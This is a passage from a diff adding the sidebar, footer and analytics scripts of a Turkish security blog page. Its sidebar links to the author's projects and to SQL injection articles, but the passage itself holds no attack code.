+        $("#addcommentform-sql-injection-cheatsheet").ajaxForm({beforeSubmit: SendingForm, success: GetResponse});
+</script>
+</div>
+		<!-- Content Wrapper -->
+		</div>
+	</div>    
+	<div id="navigation" >
+    
+	    <div class="section">
+			<div style="text-align:center">               
+
+</div>
+
+			<h2><span id="ferruh">ferruh.mavituna</span></h2>
+			<div class="about">               
+				<p>Site genel olarak g&#252;venlik, internet ve web teknolojileri &#252;zerine yazd&#305;&#287;&#305;m yaz&#305;lardan olu&#351;maktad&#305;r. Sitede <strong>2003 y&#305;l&#305;ndan</strong> bu yana yaz&#305;lm&#305;&#351; <strong>1750' den fazla yaz&#305;</strong> bulunmaktad&#305;r.</p>
+				<p>
+				Bunun yan&#305;nda <a href="/projects-browse/">projeler</a> de geli&#351;tirdi&#287;im projeleri, <a href="/white-papers-browse/">ar-ge</a> k&#305;sm&#305;nda g&#252;venlik ara&#351;t&#305;rma dok&#252;manlar&#305;ma ula&#351;abilir, <a href="/applications-browse/">programlar</a> k&#305;sm&#305;ndan yazd&#305;&#287;&#305;m yaz&#305;l&#305;mlar&#305; download edebilirsiniz. <a href="/hakkinda-oku/">Site hakk&#305;nda.</a> </p>
+			</div>
+			<div class="aboute">
+				<p>List of <a href="/tag/english/">english articles</a>, <a href="/search/?s=1&AnyTag=&Tags=english&q=&SearchTitle=&SearchArticle=&SearchTitle=&ExactMatch=&Asc=&Order=&StartDate=&EndDate=&Featured=&OrderByTalk=&OrderByPopulatity=&RSS=1">RSS</a> or <a href="/english-browse/"> try this page</a>.</p>
+			</div>
+
+		</div>
+		<div class="section">
+		
+			
+			<h2><span>PROJECTS</span></h2>
+			<ul>
+			<li><a href="http://code.google.com/p/fm-fsf/">Freaking Simple Fuzzer</a></li>
+			<li><a href="http://code.google.com/p/psychofolder/">Psycho Folder</a></li>
+			<li><a href="http://labs.portcullis.co.uk/application/bsql-hacker/">BSQL Hacker</a></li>
+			<li><a href="/windows-md5-checksum-tool-oku/">Win MD5 Checksum Tool</a></li>
+			<li><a href="/hocus-pocus-hide-your-applications-anti-boss-style-oku/">Hocus Pocus</a></li>						
+			<li><a href="/sql-injection-cheatsheet-oku/">SQL Injection Cheat Sheet</a></li>
+			<li><a href="http://www.mavitunasecurity.com/blog/webraider/">WebRaider</a></li>
+			
+			<!--<li><a href="http://www.sqlinjectionwiki.com/">SQL Injection Wiki</a></li>
+			<li><a href="http://www.refactormyregex.com/">Refactor My RegEx</a></li>
+			<li><a href="http://www.birseyogren.com/">Bir sey ogren</a></li>-->
+		   </ul>
+		</div>
+		
+		
+				<div class="section">
+		
+			
+			<h2><span>ARAMA</span></h2>
+						<form name="asearch" id="asearch" action="/search/" method="get">
+						    <input type="text" value="" id="q" name="q" style="width:200px" />
+						    <input type="submit" value="Ara" class="but" style="width:50px"/><br />
+						    <input type="hidden" name="SearchArticle" value="1" />
+						    <input type="hidden" name="SearchTitle" value="1" />
+						    <a href="/advancedsearch/">Detayl&#305; Arama</a>
+						</form>		
+		</div>
+
+				<div class="section">
+			<h2><span>TAK&#304;P</span></h2>
+				<div style="text-align:center">
+					<a href="/rss/"><img src="/mg/icons/rss.png" width="28" height="28" alt="Siteyi RSS ile Takip Et" /></a> 
+					<a href="http://www.feedburner.com/fb/a/emailverifySubmit?feedId=333622&amp;loc=en_US"><img src="/mg/icons/mail.png" width="28" height="28" alt="Siteyi E-mail ile Takip Et" /></a>
+					<a href="http://feeds.feedburner.com/fmavituna"><img src="http://feeds.feedburner.com/~fc/fmavituna?bg=FF99CC&amp;fg=000000&amp;anim=1" height="26" width="88" style="border:0" alt="RSS Takip&#231;ileri" /></a>
+<br />
+					<a href="http://whos.amung.us/show/s6h5ipp4"><img src="http://whos.amung.us/cwidget/s6h5ipp4/f37433ffffff.png" alt="website stats" width="81" height="29" /></a> 
+					<a href="http://twitter.com/fmavituna"><img src="/mg/icons/twitter.png" alt="Follow me on Twitter" width="28" height="28" /></a> 
+					<a href="http://friendfeed.com/fmavituna"><img src="/mg/icons/friendfeed.png" alt="Follow me on FriendFeed" width="28" height="28" /></a> 
+				</div>
+		</div>
+
+
+
+		<div class="section">
+           <h2><span>YORUMLAR</span></h2>
+           <div id="livecomments"></div>
+        </div>
+
+		<div class="section">
+		<h2><span>CANLI YAYIN</span></h2>
+<script type="text/javascript" src="http://friendfeed.com/embed/widget/fmavituna?v=2&amp;hide_logo=1&amp;hide_comments_likes=1"></script><noscript><a href="http://friendfeed.com/fmavituna"><img alt="View my FriendFeed" style="border:0;" src="http://friendfeed.com/embed/widget/fmavituna?v=2&amp;hide_logo=1&amp;hide_comments_likes=1&amp;format=png"/></a></noscript>
+			<style>
+				div .friendfeed { border:none !important}
+			</style>
+
+		</div>
+
+	
+		<div class="section">
+           <h2><span>KATEGOR&#304;LER</span></h2>
+           <ul>
+               <li><a href="/cat-projects-browse/">Projeler - Programlar</a></li>
+               <li><ul>
+                    <li><a href="/bsql-hacker-and-deep-blind-sql-injections-oku/">BSQL Hacker</a></li>
+                    <!-- <li><a href="/eski-projeler-oku/">Eski Programlar ve Projeler</a></li> -->
+               </ul></li>
+               <li><a href="/cat-featured-browse/">En &#304;yi Yaz&#305;lar</a></li>
+               <li><a href="/cat-security-browse/">G&#252;venlik</a></li>
+               <li><a href="/cat-development-browse/">Yaz&#305;l&#305;m Geli&#351;tirme</a></li>
+               <li><a href="/cat-book-browse/">Kitap</a></li>
+               <li><a href="/cat-personal-browse/">Ki&#351;isel / Hayat</a></li>          
+               <li><a href="/cat-personal-development-browse/">Ki&#351;isel Geli&#351;im</a></li>
+               <li><a href="/cat-personal-development-browse/">Online Ara&#231;lar ve Projeler</a></li>
+               <li><ul>
+                    <li><a href="/tools/converter/">Encoder / Converter</a></li>
+               </ul>              </li>
+               <li><a href="/sql+injection-browse/">SQL Injection</a></li>
+               <li><ul>
+                    <li><a href="/makale/sql-injection-derslerine-giris/">SQL Injection Dersleri</a></li>
+                    <li><a href="/makale/sql-injection-cheatsheet/">SQL Injection Cheat Sheet</a></li>
+                    <li><a href="/makale/oracle-sql-injection-cheat-sheet/">ORACLE SQL Injection Cheat Sheet</a></li>
+                    <li><a href="/makale/record-locater-for-sql-injection/">Record Locator</a><br /></li>
+                    <li><a href="/makale/fast-way-to-extract-data-from-error-based-sql-injections/">Error Based SQL Injections</a></li>
+                </ul> </li>             
+
+               <li><a href="/tags/"><strong>T&#252;m Kategoriler</strong></a></li>
+           </ul>
+                      
+	    </div>
+
+
+
+
+		<div class="section">
+			<h2><span>AR&#350;&#304;V</span></h2>
+				<h3>Senelere G&#246;re Ar&#351;ivler</h3>
+				<ul>
+					<li><a href="/archive/year/2010/">2010</a> (git say!)</li>
+					<li><a href="/archive/year/2009/">2009</a> (40 yaz&#305;)</li>
+					<li><a href="/archive/year/2008/">2008</a> (147 yaz&#305;)</li>
+					<li><a href="/archive/year/2007/">2007</a> (358 yaz&#305;)</li>
+					<li><a href="/archive/year/2006/">2006</a> (299 yaz&#305;)</li>
+					<li><a href="/archive/year/2005/">2005</a> (356 yaz&#305;)</li>
+					<li><a href="/archive/year/2004/">2004</a> (350 yaz&#305;)</li>
+					<li><a href="/archive/year/2003/">2003</a> (245 yaz&#305;)</li>
+				</ul>
+
+				<h3>Di&#287;er Ar&#351;iv Eri&#351;imleri</h3>
+				<ul>
+					<li><a href="/tags/">Etiket Ar&#351;ivi</a></li>
+					<li><a href="/archive/titles/">Son Yaz&#305;lar</a></li>
+					<li><a href="/archive/featured/">En iyi Yaz&#305;lar</a></li>
+					<li><a href="/archive/popular/">En Pop&#252;ler Yaz&#305;lar</a></li>
+					<li><a href="/archive/looser/">En T&#305;rt Yaz&#305;lar</a></li>
+					<li><a href="/archive/sensational/">&#199;ok konu&#351;ulan Yaz&#305;lar</a></li>
+					<li><a href="/archive/whocares/">Kimsenin Takmad&#305;&#287;&#305; Yaz&#305;lar</a></li>
+					
+				</ul>
+	</div> 
+
+<p>&nbsp;</p>
+
+	</div> <!-- navigation -->
+<!--	<div id="paging">
+		<p>.</p>
+	</div>-->
+
+</div> <!-- Main Container -->
+
+<div id="footer">
+    
+    <div align="center">
+        <div class="content">  
+            Ferruh Mavituna &#169; 2002-2009<br />
+            <a href="/hakkinda-oku/">Hakk&#305;nda</a>, <a href="/contact/">&#304;leti&#351;im</a>, <a href="/newspaper/">Okuduklar&#305;m</a>, <a href="http://www.feedburner.com/fb/a/emailverifySubmit?feedId=333622&amp;loc=en_US">Mail-List</a>, <a href="/rss/">RSS</a>
+            </p>
+            
+        </div>
+    
+    </div>
+</div>
+
+<script type="text/javascript">
+var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+</script>
+<script type="text/javascript">
+var pageTracker = _gat._getTracker("UA-105651-3");
+pageTracker._trackPageview(document.referrer);
+</script>
+
+</body>
+</html>
